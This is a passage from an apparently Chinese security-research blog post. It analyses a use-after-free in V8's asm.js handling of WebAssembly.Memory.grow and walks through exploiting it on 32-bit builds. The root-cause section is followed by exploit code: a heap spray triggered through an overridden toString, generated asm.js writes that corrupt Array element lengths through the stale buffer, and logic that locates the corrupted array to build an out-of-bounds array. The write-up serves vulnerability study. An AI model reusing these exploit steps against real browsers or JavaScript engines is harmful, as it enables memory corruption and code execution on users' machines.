<p>该不可访问地址实际就是<code>ArrayBuffer</code>的<code>backing_store</code>，那么可能的原因是<code>memory.grow(1);</code>操作使得<code>ArrayBuffer</code>的<code>backing_store</code>被释放掉了。我们在<code>memory.grow(1);</code>之后加一句<code>%DebugPrint(buffer);</code>，可以发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x5c518941: [JSArrayBuffer] in OldSpace</span><br><span class="line"> - map = 0x2a0847b9 [FastProperties]</span><br><span class="line"> - prototype = 0x5c508ac5</span><br><span class="line"> - elements = 0x2de8412d &lt;FixedArray[0]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - backing_store = (nil)</span><br><span class="line"> - byte_length = 0</span><br><span class="line"> - external</span><br><span class="line"> - neuterable</span><br><span class="line"> - neutered</span><br><span class="line"> - wasm_buffer</span><br><span class="line"> - properties = 0x2de8412d &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    (nil)</span><br><span class="line">    (nil)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>ArrayBuffer的一些指针确实被清空掉了，但是<code>asm.js</code>里访问时仍然使用了原来那个指针，这是一个<code>UAF</code>。</p>
<h3 id="asm-js的UAF成因分析"><a href="#asm-js的UAF成因分析" class="headerlink" title="asm.js的UAF成因分析"></a>asm.js的UAF成因分析</h3><p>在分析这个UAF之前，我们先大致了解一下<code>asm.js</code>的编译过程，一个比较关键的地方是位于<code>src/wasm/module-compiler.cc</code>文件中的<code>InstanceBuilder::Build</code>函数，第<code>1792</code>行开始，获取外部传入的<code>ArrayBuffer</code>对象，并设置一些属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  1792   if (!memory_.is_null()) &#123;</span><br><span class="line">  1793     Handle&lt;JSArrayBuffer&gt; memory = memory_.ToHandleChecked();</span><br><span class="line">  1794     // Set externally passed ArrayBuffer non neuterable.</span><br><span class="line">► 1795     memory-&gt;set_is_neuterable(false);</span><br><span class="line">  1796     memory-&gt;set_is_wasm_buffer(true);</span><br><span class="line">  1797 </span><br><span class="line">  1798     DCHECK_IMPLIES(trap_handler::UseTrapHandler(),</span><br><span class="line">  1799                    module_-&gt;is_asm_js() || memory-&gt;has_guard_region());</span><br><span class="line">  1800   &#125; else if (initial_pages &gt; 0) &#123;</span><br></pre></td></tr></table></figure>
<p>然后第<code>1838</code>行开始，进行一些检查，然后将<code>ArrayBuffer</code>对象设置到<code>instance</code>实例中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  1838   Address mem_start = nullptr;</span><br><span class="line">  1839   uint32_t mem_size = 0;</span><br><span class="line">  1840   if (!memory_.is_null()) &#123;</span><br><span class="line">  1841     Handle&lt;JSArrayBuffer&gt; memory = memory_.ToHandleChecked();</span><br><span class="line">  1842     mem_start = static_cast&lt;Address&gt;(memory-&gt;backing_store());</span><br><span class="line">► 1843     CHECK(memory-&gt;byte_length()-&gt;ToUint32(&amp;mem_size));</span><br><span class="line">  1844     LoadDataSegments(mem_start, mem_size);</span><br><span class="line">  1845     // Just like with globals, we need to keep both the JSArrayBuffer</span><br><span class="line">  1846     // and save the start pointer.</span><br><span class="line">  1847     instance-&gt;set_memory_buffer(*memory);</span><br><span class="line">  1848   &#125;</span><br></pre></td></tr></table></figure>
<p>然后第<code>1854</code>行，使用<code>WasmMemoryObject::New</code>创建了一个<code>memory_object</code>，并将其设置到<code>instance</code>实例中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/v8/src/wasm/module-compiler.cc</span><br><span class="line">   1853   if (module_-&gt;has_memory &amp;&amp; !instance-&gt;has_memory_object()) &#123;</span><br><span class="line">   1854     Handle&lt;WasmMemoryObject&gt; memory_object = WasmMemoryObject::New(</span><br><span class="line">   1855         isolate_,</span><br><span class="line">   1856         instance-&gt;has_memory_buffer() ? handle(instance-&gt;memory_buffer())</span><br><span class="line">   1857                                       : Handle&lt;JSArrayBuffer&gt;::null(),</span><br><span class="line"> ► 1858         module_-&gt;maximum_pages != 0 ? module_-&gt;maximum_pages : -1);</span><br><span class="line">   1859     instance-&gt;set_memory_object(*memory_object);</span><br><span class="line">   1860   &#125;</span><br></pre></td></tr></table></figure>
<p>接下来为新创建的<code>memory_object</code>设置<code>instance</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   1904 </span><br><span class="line">   1905   //--------------------------------------------------------------------------</span><br><span class="line">   1906   // Add instance to Memory object</span><br><span class="line">   1907   //--------------------------------------------------------------------------</span><br><span class="line">   1908   if (instance-&gt;has_memory_object()) &#123;</span><br><span class="line"> ► 1909     Handle&lt;WasmMemoryObject&gt; memory(instance-&gt;memory_object(), isolate_);</span><br><span class="line">   1910     WasmMemoryObject::AddInstance(isolate_, memory, instance);</span><br><span class="line">   1911   &#125;</span><br><span class="line">   1912 </span><br><span class="line">pwndbg&gt; p memory</span><br><span class="line">$10 = &#123;</span><br><span class="line">  &lt;v8::internal::HandleBase&gt; = &#123;</span><br><span class="line">    location_ = 0x5671d6ac</span><br><span class="line">  &#125;, &lt;No data fields&gt;&#125;</span><br><span class="line">pwndbg&gt; p *memory</span><br><span class="line">$11 = (v8::internal::WasmMemoryObject *) 0x5b498b29</span><br></pre></td></tr></table></figure>
<p>执行完后，该<code>memory_object</code>调用<code>has_instances</code>会返回<code>true</code>，说明已经为该<code>memory_object</code>设置好了实例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p instance-&gt;memory_object()-&gt;has_instances()</span><br><span class="line">$13 = true</span><br></pre></td></tr></table></figure>
<p>在分析完<code>asm.js</code>模块的编译过程以后，我们再来看一下JS层的<code>grow</code>函数。该函数的实现位于<code>src/wasm/wasm-js.cc</code>文件中的<code>WebAssemblyMemoryGrow</code>函数。第<code>745</code>行<code>EXTRACT_THIS(receiver, WasmMemoryObject);</code>获取到了js层的<code>var memory = new WebAssembly.Memory(&#123;initial:200&#125;);</code>这个对象。显然，在这里也表示为一个·<code>WasmMemoryObject</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  740   i::Isolate* i_isolate = reinterpret_cast&lt;i::Isolate*&gt;(isolate);</span><br><span class="line">  741   HandleScope scope(isolate);</span><br><span class="line">  742   i::wasm::ScheduledErrorThrower thrower(i_isolate,</span><br><span class="line">  743                                          &quot;WebAssembly.Memory.grow()&quot;);</span><br><span class="line">  744   Local&lt;Context&gt; context = isolate-&gt;GetCurrentContext();</span><br><span class="line">► 745   EXTRACT_THIS(receiver, WasmMemoryObject);</span><br><span class="line">  746 </span><br><span class="line">  747   int64_t delta_size = 0;</span><br><span class="line">  748   if (!args[0]-&gt;IntegerValue(context).To(&amp;delta_size)) return;</span><br><span class="line">  749 </span><br><span class="line">  750   int64_t max_size64 = receiver-&gt;maximum_pages();</span><br></pre></td></tr></table></figure>
<p>然后这里获取到ArrayBuffer对象以及一些属性，并在旧的size基础上加上增量以后进行一些范围检查。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/v8/src/wasm/wasm-js.cc</span><br><span class="line">   752       max_size64 &gt; static_cast&lt;int64_t&gt;(i::FLAG_wasm_max_mem_pages)) &#123;</span><br><span class="line">   753     max_size64 = i::FLAG_wasm_max_mem_pages;</span><br><span class="line">   754   &#125;</span><br><span class="line">   755   i::Handle&lt;i::JSArrayBuffer&gt; old_buffer(receiver-&gt;array_buffer());</span><br><span class="line">   756   uint32_t old_size =</span><br><span class="line"> ► 757       old_buffer-&gt;byte_length()-&gt;Number() / i::wasm::kSpecMaxWasmMemoryPages;</span><br><span class="line">   758   int64_t new_size64 = old_size + delta_size;</span><br><span class="line">   759   if (delta_size &lt; 0 || max_size64 &lt; new_size64 || new_size64 &lt; old_size) &#123;</span><br><span class="line">   760     thrower.RangeError(new_size64 &lt; old_size ? &quot;trying to shrink memory&quot;</span><br><span class="line">   761                                              : &quot;maximum memory size exceeded&quot;);</span><br><span class="line">   762     return;</span><br></pre></td></tr></table></figure>
<p>接下来调用<code>WasmMemoryObject::Grow</code>对<code>ArrayBuffer</code>的<code>backing_store</code>进行扩容，我们跟进该函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► 764   int32_t ret = i::WasmMemoryObject::Grow(i_isolate, receiver,</span><br><span class="line">  765                                           static_cast&lt;uint32_t&gt;(delta_size));</span><br><span class="line">  766   if (ret == -1) &#123;</span><br><span class="line">  767     thrower.RangeError(&quot;Unable to grow instance memory.&quot;);</span><br><span class="line">  768     return;</span><br><span class="line">  769   &#125;</span><br></pre></td></tr></table></figure>
<p>在<code>WasmMemoryObject::Grow</code>函数里，通过一些检查以后，就调用<code>GrowMemoryBuffer</code>来分配一块更大的内存了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  476   uint32_t maximum_pages = FLAG_wasm_max_mem_pages;</span><br><span class="line">  477   if (memory_object-&gt;has_maximum_pages()) &#123;</span><br><span class="line">  478     maximum_pages = Min(FLAG_wasm_max_mem_pages,</span><br><span class="line">  479                         static_cast&lt;uint32_t&gt;(memory_object-&gt;maximum_pages()));</span><br><span class="line">  480   &#125;</span><br><span class="line">► 481   new_buffer = GrowMemoryBuffer(isolate, old_buffer, pages, maximum_pages);</span><br><span class="line">  482   if (new_buffer.is_null()) return -1;</span><br></pre></td></tr></table></figure>
<p>接下来来到这里，漏洞关键点来了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> ► 484   if (memory_object-&gt;has_instances()) &#123;</span><br><span class="line">   485     Handle&lt;WeakFixedArray&gt; instances(memory_object-&gt;instances(), isolate);</span><br><span class="line">   486     for (int i = 0; i &lt; instances-&gt;Length(); i++) &#123;</span><br><span class="line">   487       Object* elem = instances-&gt;Get(i);</span><br><span class="line">   488       if (!elem-&gt;IsWasmInstanceObject()) continue;</span><br><span class="line">   489       Handle&lt;WasmInstanceObject&gt; instance(WasmInstanceObject::cast(elem),</span><br><span class="line">pwndbg&gt; p memory_object-&gt;has_instances()</span><br><span class="line">$17 = false</span><br></pre></td></tr></table></figure>
<p>因为这里的<code>memory_object</code>来自与JS层的那个<code>memory</code>对象，而不是在<code>InstanceBuilder::Build</code>函数中创建的那个，因此<code>memory_object-&gt;has_instances()</code>返回的是<code>false</code>。<br>这意味着下面的代码不会执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (memory_object-&gt;has_instances()) &#123;</span><br><span class="line">  Handle&lt;WeakFixedArray&gt; instances(memory_object-&gt;instances(), isolate);</span><br><span class="line">  for (int i = 0; i &lt; instances-&gt;Length(); i++) &#123;</span><br><span class="line">    Object* elem = instances-&gt;Get(i);</span><br><span class="line">    if (!elem-&gt;IsWasmInstanceObject()) continue;</span><br><span class="line">    Handle&lt;WasmInstanceObject&gt; instance(WasmInstanceObject::cast(elem),</span><br><span class="line">                                        isolate);</span><br><span class="line">    SetInstanceMemory(isolate, instance, new_buffer);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于<code>SetInstanceMemory(isolate, instance, new_buffer);</code>没有执行，导致<code>wasm</code>的实例里保存的那个<code>buffer</code>仍然是最开始那个<code>buffer</code>的地址，没有将<code>new_buffer</code>更新进去。此时程序继续执行，更新JS层的<code>memory</code>对象</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  494   memory_object-&gt;set_array_buffer(*new_buffer);</span><br><span class="line">► 495   return old_size / WasmModule::kPageSize;</span><br></pre></td></tr></table></figure>
<p>接下来是对<code>old_buffer</code>进行处理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  770   if (!old_buffer-&gt;is_shared()) &#123;</span><br><span class="line">  771     // When delta_size == 0, or guard pages are enabled, the same backing store</span><br><span class="line">  772     // is used. To be spec compliant, the buffer associated with the memory</span><br><span class="line">  773     // object needs to be detached. Setup a new buffer with the same backing</span><br><span class="line">  774     // store, detach the old buffer, and do not free backing store memory.</span><br><span class="line">► 775     bool free_memory = delta_size != 0 &amp;&amp; !old_buffer-&gt;has_guard_region();</span><br><span class="line">  776     if ((!free_memory &amp;&amp; old_size != 0) || new_size64 == 0) &#123;</span><br><span class="line">  777       i::WasmMemoryObject::SetupNewBufferWithSameBackingStore(</span><br><span class="line">  778           i_isolate, receiver, static_cast&lt;uint32_t&gt;(new_size64));</span><br><span class="line">  779     &#125;</span><br><span class="line">  780     i::wasm::DetachMemoryBuffer(i_isolate, old_buffer, free_memory);</span><br></pre></td></tr></table></figure>
<p>我们跟进<code>DetachMemoryBuffer</code>函数，这里将<code>old_buffer</code>的<code>backing_store</code>给释放掉了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/v8/src/wasm/wasm-memory.cc</span><br><span class="line">   120       // We need to free the memory before neutering the buffer because</span><br><span class="line">   121       // FreeBackingStore reads buffer-&gt;allocation_base(), which is nulled out</span><br><span class="line">   122       // by Neuter. This means there is a dangling pointer until we neuter the</span><br><span class="line">   123       // buffer. Since there is no way for the user to directly call</span><br><span class="line">   124       // FreeBackingStore, we can ensure this is safe.</span><br><span class="line"> ► 125       buffer-&gt;FreeBackingStore();</span><br><span class="line">   126     &#125;</span><br><span class="line">   127   &#125;</span><br><span class="line">   128   buffer-&gt;set_is_neuterable(true);</span><br><span class="line">   129   buffer-&gt;Neuter();</span><br><span class="line">   130 &#125;</span><br></pre></td></tr></table></figure>
<p>可以看出，由于没有更新<code>wasm</code>实例里的<code>ArrayBuffer</code>对象，并且后面该<code>ArrayBuffer</code>被释放，由此导致了UAF的产生，原来<code>backing_store</code>的内存空间被<code>unmmap</code>掉了，使得其不再出现在映射表中。当我们再次访问这块内存时，便出现了段错误。</p>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>现在，我们制造出了一个UAF，但是<code>backing_store</code>的内存与一般对象的内存地址是分开的，不能指望将其他对象占位与此。与<code>backing_store</code>类似的是<code>Array</code>的<code>Element</code>，它们都属于大容量存储，因此它们之间很可能会分配到相邻的地址或者地址相差较小的位置。因此，我们可以考虑使用<code>Heap Spray</code>技术，在<code>backing_store</code>地址附近都布局下<code>Array</code>的<code>Element</code>对象，然后通过<code>UAF</code>去控制。由于64位内存空间太大，<code>Heap Spray</code>似乎无法成功将<code>Element</code>对象放到<code>backing_store</code>地址附近，因此这个漏洞目前仅在32位下成功利用。</p>
<h3 id="何时进行-Heap-Spray"><a href="#何时进行-Heap-Spray" class="headerlink" title="何时进行 Heap Spray"></a>何时进行 Heap Spray</h3><p>我们需要寻找一个合适的时机进行<code>Heap Spray</code>，在<code>asm.js</code>模块的汇编代码中，我们注意到如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x255062c0     0  55             push ebp</span><br><span class="line">0x255062c1     1  89e5           mov ebp,esp</span><br><span class="line">0x255062c3     3  56             push esi</span><br><span class="line">0x255062c4     4  57             push edi</span><br><span class="line">0x255062c5     5  8b4508         mov eax,[ebp+0x8]</span><br><span class="line">0x255062c8     8  e8d303b035     call 0x5b0066a0  (ToNumber)    ;; code: BUILTIN</span><br><span class="line">0x255062cd     d  a801           test al,0x1</span><br><span class="line">0x255062cf     f  0f8528000000   jnz 0x255062fd  &lt;+0x3d&gt;</span><br><span class="line">0x255062d5    15  d1f8           sar eax,1</span><br><span class="line">.....................</span><br></pre></td></tr></table></figure>
<p>可以看到，因为我们在<code>asm.js</code>模块中声明<code>x = x | 0;</code>，所以会先调用<code>ToNumber</code>获取对象<code>x</code>的值，而<code>ToNumber</code>会调用对象内部的<code>toString</code>函数，因此，我们可以重写<code>toString</code>函数，并在<code>toString</code>函数里开始<code>Heap Spray</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//堆喷</span><br><span class="line">var victim_array = [];</span><br><span class="line">victim_array.length = 0x750;</span><br><span class="line">var array = [1.1];</span><br><span class="line">array.length = 0x10000;</span><br><span class="line">array.fill(2.2);</span><br><span class="line">function spray_heap() &#123;</span><br><span class="line">    for(var i = 0;i &lt; victim_array.length;i++)&#123;</span><br><span class="line">        victim_array[i] = array.slice(0,array.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">..........................</span><br><span class="line">//重写对象的toString函数，这样在执行ToNumber时可以同时触发Hpeap Spray</span><br><span class="line">trigger = &#123;&#125;;</span><br><span class="line">trigger.toString = function()&#123;</span><br><span class="line">    spray_heap();</span><br><span class="line">    return 0xffffffff;</span><br><span class="line">&#125;;</span><br><span class="line">evil_f(trigger);</span><br></pre></td></tr></table></figure>
<p>使用gdb调试，然后断在崩溃处</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> EAX  0x6666666a (&#x27;jfff&#x27;)</span><br><span class="line"> EBX  0x80108</span><br><span class="line"> ECX  0xc80000</span><br><span class="line"> EDX  0xf4cb4000</span><br><span class="line"> EDI  0x5403aff1 —▸ 0x4e536848 ◂— 0x9999999a</span><br><span class="line"> ESI  0x5858aab0 ◂— 0xf4cb4000</span><br><span class="line"> EBP  0xffcd9da8 —▸ 0xffcd9df8 —▸ 0xffcd9e10 —▸ 0xffcd9e38 —▸ 0xffcd9ee8 ◂— ...</span><br><span class="line"> ESP  0xffcd9d9c —▸ 0x52786292 ◂— mov    eax, 0x27184185 /* 0x184185b8 */</span><br><span class="line"> EIP  0x527864ee ◂— mov    dword ptr [edx + ebx], eax /* 0xbb1a0489 */</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x527864ee    mov    dword ptr [edx + ebx], eax</span><br></pre></td></tr></table></figure>
<p>当前访问的地址是<code>0xf4cb4000</code>，查看其附近的内存</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.................</span><br><span class="line">0xf4024000 0xf4cb4000 rw-p   c90000 0      </span><br><span class="line">0xf4d80000 0xf4e05000 rw-p    85000 0      </span><br><span class="line">0xf4e80000 0xf4f05000 rw-p    85000 0      </span><br><span class="line">...............</span><br></pre></td></tr></table></figure>
<p>可以看到<code>0xf4cb4000</code>上方和下方很多<code>0x85000</code>大小的内存空间，这是正是堆喷到此处的一些<code>Array</code>对象以及<code>Elements</code>对象，我们在gdb中使用<code>find</code>命令查找紧挨着的一块内存里的关键字</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /w4 0xf4d80000,0xf4e05000,0x9999999a</span><br></pre></td></tr></table></figure>
<p>结果如下，我们看到最近的一个数据位于<code>0xf4d84108</code>，可以看到该处正是某一个<code>Array</code>对象的<code>Element</code>，它与<code>backing_store</code>之间相差<code>0xd0108</code>，这个偏移并不是固定不变的，但是后12bit是固定不变的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0xf4d84108</span><br><span class="line">0xf4d84110</span><br><span class="line">0xf4d84118</span><br><span class="line">0xf4d84120</span><br><span class="line">pwndbg&gt; x /20wx 0xf4d84108-0x8</span><br><span class="line">0xf4d84100:	0x536846f1	0x00020000	0x9999999a	0x40019999</span><br></pre></td></tr></table></figure>
<p>我们可以将所有的可能偏移都罗列出来，由于这些偏移在之前那个<code>ArrayBuffer</code>的length范围之内，也就是说该对象存在于那个UAF的空间里，于是我们可以利用UAF来改写<code>Element</code>，我们可以修改<code>Element</code>的<code>length</code>属性，这样，我们可以后续构造出一个<code>oob</code>数组，为了区别，我们还需要修改<code>Element</code>的第一个元素，这样方便我们找到到底是哪个<code>Array</code>的<code>Element</code>堆喷于此处。<br>为了方便罗列这些可能的偏移，并进行写，我们使用JS的模板来生成多种可能的偏移写语句，方便操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//距离不是固定的，因此需要将所有可能的距离都赋值,我们要修改Element的length和第一个元素</span><br><span class="line">let loop = &quot;&quot;;</span><br><span class="line">for(let i = 0; i &lt; 0xd0; i++) &#123;</span><br><span class="line">    loop += `fl[$&#123;0x21041 + 0x100 * i&#125;] = x;fl[$&#123;0x21042 + 0x100 * i&#125;] = x;`;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let eval_str = `</span><br><span class="line">function module(stdlib, foreign, buffer) &#123;</span><br><span class="line">    &quot;use asm&quot;;</span><br><span class="line">    var fl = new stdlib.Uint32Array(buffer);</span><br><span class="line">    function foo(x) &#123;</span><br><span class="line">        x = x | 0;</span><br><span class="line">        $&#123;loop&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return foo;</span><br><span class="line">&#125;</span><br><span class="line">`</span><br><span class="line">eval(eval_str);</span><br></pre></td></tr></table></figure>
<p>接下来就是搜索哪个被修改过的<code>Array</code>对象了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//找到那个能够被我们UAF控制的Array</span><br><span class="line">var corrupted_array = undefined;</span><br><span class="line">for(var i = 0; i &lt; victim_array.length; i++) &#123;</span><br><span class="line">    tmp = victim_array[i];</span><br><span class="line">    if (tmp[0] !== 2.2) &#123;</span><br><span class="line">        console.log(&quot;[+] array at : &quot; + i);</span><br><span class="line">        corrupted_array = victim_array[i];</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时，我们得继续寻找该<code>Array</code>对象<code>Elements</code>后方的<code>Elements</code>属于哪个<code>Array</code>，其中注意到，由于<code>corrupted_array</code>的elements的length被我们修改成了0xFFFFFFFF，因此在这里加大length，elements仍然不变，相当于构造了一个oob数组，这个特性也是新学到的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//寻找corrupted_array的后面是哪个Array对象的elements</span><br><span class="line">var next_array_idx = undefined;</span><br><span class="line">var tag = p64f(0x12345678,0x78563412)</span><br><span class="line">if (corrupted_array != undefined) &#123;</span><br><span class="line">    //由于elements的length被我们修改，因此在这里加大length，elements仍然不变，相当于构造了一个oob数组</span><br><span class="line">    corrupted_array.length = 0x200000;</span><br><span class="line">    let leaked_idx = undefined;</span><br><span class="line">    if (corrupted_array[0x20000] == 2.2) &#123;</span><br><span class="line">        corrupted_array[0x20000] = tag; //设置一个标记</span><br><span class="line">        //搜索标记</span><br><span class="line">        for(let i = 0; i &lt; victim_array.length; i++) &#123;</span><br><span class="line">            tmp = victim_array[i];</span><br><span class="line">            if (tmp[0] == tag) &#123;</span><br><span class="line">                tmp = undefined;</span><br><span class="line">                console.log(&quot;[+] next array at : &quot; + i);</span><br><span class="line">                next_array_idx = i;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    console.log(&quot;[-] fail&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们搜索<code>next_array</code>的目的是为了将<code>next_array</code>进行释放。这样方便我们进行第二轮<code>Heap Spray</code>，将其他对象布局到此处，然后用<code>corrupted_array </code>进行控制。</p>
